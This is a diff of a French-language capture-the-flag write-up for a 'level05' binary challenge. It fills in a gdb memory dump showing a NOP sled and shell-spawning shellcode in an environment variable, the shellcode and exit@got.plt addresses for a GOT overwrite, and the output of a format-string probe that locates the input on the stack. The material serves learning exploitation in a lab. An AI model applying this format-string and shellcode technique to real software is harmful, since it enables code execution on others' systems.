@@ -68,9 +68,15 @@ dans la mémoire.
 
 Pour ça, on peut utiliser `gdb`.
 
-```txt
+```as
 gdb> x/100x $esp
-[TODO]
+...
+0xffffd870:	0x45485300	0x4f434c4c	0x903d4544	0x90909090
+0xffffd880:	0x90909090	0x90909090	0x90909090	0x90909090 
+0xffffd890:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd8a0:	0x90909090	0x90909090	0x90909090	0x5b0beb90
+0xffffd8b0:	0xc931c031	0x0bb0d231	0xf0e880cd	0x2fffffff
+...
 ```
 
 En cherchant la série de `0x90`, on trouve assez rapidement une adresse
@@ -83,7 +89,7 @@ gdb> print &exit@got.plt
 
 | Shellcode  | exit@got.plt |
 ----------------------------
-| 0xffffd8c0 | 0x80497e0    |
+| 0xffffd8a0 | 0x80497e0    |
 
 ### Trouver notre input
 
@@ -114,7 +120,7 @@ sur la stack.
 ```txt
 ./level05
 aaaabbbbcccc%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
-[TODO]
+aaaabbbbcccc00000064f7fcfac0f7ec3af9ffffd66fffffd66e00000000ffffffffffffd6f4f7fdb0006161616162626262636363637838302578383025
 ```
 
 Nous permet de déterminer que `aaaa` est à une distance de 80 octets. `bbbb`
